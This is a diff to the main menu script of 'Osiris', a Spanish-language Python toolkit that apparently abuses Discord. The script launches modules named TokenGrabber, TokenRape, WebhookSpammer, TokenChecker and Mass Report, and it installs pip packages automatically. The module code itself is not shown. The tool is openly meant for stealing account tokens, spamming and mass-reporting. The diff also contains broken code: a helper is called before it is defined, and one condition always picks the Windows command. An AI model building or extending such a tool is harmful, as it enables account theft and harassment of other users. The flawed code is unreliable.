@@ -1,11 +1,9 @@
 try:
-    import time
-    import os
-    import sys
-    from pyfade import Colors, Fade, Anime
+    import os, sys
+    from time import sleep
+    from pystyle import Colorate, Colors
     from os import name, mkdir, system
     from os.path import isdir
-    from colorama import Fore
     import modules.massReport as massReport
     import modules.credits as credits
     import modules.tokenGrabber as grabber
@@ -19,21 +17,34 @@ try:
 except ImportError as ex:
     def clear():
         os.system("cls" if os.name == 'nt' else "clear")
-    print('[+] Instalando requisitos, espere')
+        print(f'\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.white} Instalando requisitos, espere')
+        os.system("cls")
+    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando psutil... {Colors.white}")
+    os.system("pip install psutil")
+    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando pypiwin32... {Colors.white}")
+    os.system("pip install pypiwin32")
+    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando pillow... {Colors.white}")
+    os.system("pip install pillow")
+    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando colorama... {Colors.white}")
     os.system('pip install colorama')
-    os.system('pip install pyfade')
+    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando pystyle... {Colors.white}")
+    os.system('pip install pystyle')
+    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando requests... {Colors.white}")
     os.system('pip install requests')
-    from colorama import Fore
-    print(Fore.BLUE + '[+] Requisitos instalados, vuelva a abrir osiris' + Fore.RESET)
-    time.sleep(2)
+    print(f'{Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.white} Requisitos instalados, reabriendo Osiris...')
+    os.system('python osiris.py')
+    sleep(2)
     exit()
 def clear():
     system("cls" if name == 'nt' else "clear")
 if name == 'nt':
-    system("title Osiris & mode 150, 40")
+        system("title Osiris")
 
+def tortuga(_str):
+    for letra in _str:
+        sys.stdout.write(letra);sys.stdout.flush();sleep(0.03)
 
-class Client:
+class Client: 
     def __init__(self):
         modules = {
             "1" : {"function" : tokenRape.rape, "name" : "TokenRape"},
@@ -50,72 +61,35 @@ class Client:
             "12" : {"function" : exit, "name" : "Salir"},
         }
         self.modules = modules
-
     def main(self):
         os.system('cls' if os.name == 'nt' else 'clear')
-        textooo = f"""
-                          ▒
-                         ░█
-                        ███
-                       ██ღ█
-                      ██ღ▒█      ▒█
-                     ██ღ░▒█       ██
-                     █ღ░░ღ█      █ღ▒█
-                    █▒ღ░▒ღ░█   ██░ღღ█
-                   ░█ღ▒░░▒ღ░████ღღღ█
-           ░       █▒ღ▒░░░▒ღღღ░ღღღ██     ░█
-           ▓█     ░█ღ▒░░░░░░░▒░ღღ██     ▓█░
-           ██     █▒ღ░░░░░░░░░░ღ█    ▓▓██
-           ██    ██ღ▒░░░░░░░░░ღ██ ░██ღ▒█
-          ██ღ█  ██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
-          █ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
-         ██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
-         █ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
-        ██ღღ▒████████████ღღ████████████░ღ█▒
-        █░ღღ████████████████████████████ღღ█
-        █▒ღ██████████████████████████████ღ█
-        ██ღღ████████████████████████████ღ██
-         ██ღღ██████████████████████████ღ██
-          ░██ღღ██████████████████████ღღ██
-            ▓██ღ▒██████████████████▒ღ██
-             ░███ღ▒████████████▒ღ███
-                ▒██ღღ████████▒ღ██
-                   ▒██ღ██████ღ██
-                    ██ღ████ღ█
-                       █ღ██ღ█
-                        █ღღ█
-                        █ღ█░
-                         ██░
-        Cargando...
-        """
         opts = f"""
                             
-                ░█████╗░░██████╗██╗██████╗░██╗░██████╗
-                ██╔══██╗██╔════╝██║██╔══██╗██║██╔════╝
-                ██║░░██║╚█████╗░██║██████╔╝██║╚█████╗░
-                ██║░░██║░╚═══██╗██║██╔══██╗██║░╚═══██╗
-                ╚█████╔╝██████╔╝██║██║░░██║██║██████╔╝
-                ░╚════╝░╚═════╝░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
-                
-                
-            [1]    TokenRape            [2]    WebhookSpammer
-            [3]    TokenChecker         [4]    WebhookChecker
-            [5]    HistoryClear         [6]    AutoBump
-            [7]    TokenGrabber         [8]    Server Lookup
-            [9]    Mass Report          [10]   Ayuda
-            [11]   Creditos             [12]   Salir
+               ██████╗ ███████╗██╗██████╗ ██╗███████╗
+              ██╔═══██╗██╔════╝██║██╔══██╗██║██╔════╝
+              ██║   ██║███████╗██║██████╔╝██║███████╗
+              ██║   ██║╚════██║██║██╔══██╗██║╚════██║
+              ╚██████╔╝███████║██║██║  ██║██║███████║
+               ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒
+                ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░  ░▒ ░ ▒░ ▒ ░░ ░▒
+                ░ ░ ░ ▒  ░  ░  ░   ▒ ░  ░░   ░  ▒ ░░    
+               ░   ░     ░      ░        ░  
+                                       
+                 {Colors.light_blue}[1] TokenRape            [7] TokenGrabber
+                 {Colors.light_blue}[2] WebhookSpammer       [8] Server Lookup
+                 {Colors.light_blue}[3] TokenChecker         [9] Mass Report
+                 {Colors.light_blue}[4] WebhookChecker       [10] Ayuda
+                 {Colors.light_blue}[5] HistoryClear         [11] Creditos
+                 {Colors.light_blue}[6] AutoBump             [12] Salir
             """
-        print(Anime.anime((textooo), Colors.blue_to_purple, Fade.Vertical, time=2))
-        print(Fade.Vertical(Colors.purple_to_blue, opts))
-        opcion = input(Fore.BLUE + f"[>] Opcion: " + Fore.RESET)
-
+              
+        os.system(f'cls' if 'nt' else 'clear')
+        print(Colorate.Vertical(Colors.purple_to_blue, (opts)))
+        opcion = input(f" {Colors.purple}[{Colors.light_blue}>{Colors.purple}]Opcion: {Colors.white}")
         data = self.modules[opcion]
-
         data["function"]()
-
-        input(Fore.MAGENTA + f"\n [!] Listo, presione enter para salir."+ Fore.RESET)
+        input(f" {Colors.purple}[{Colors.red}!{Colors.purple}] {Colors.white}Listo, presione enter para salir.")
         self.main()
-
 if __name__ == '__main__':
     client = Client()
     client.main()
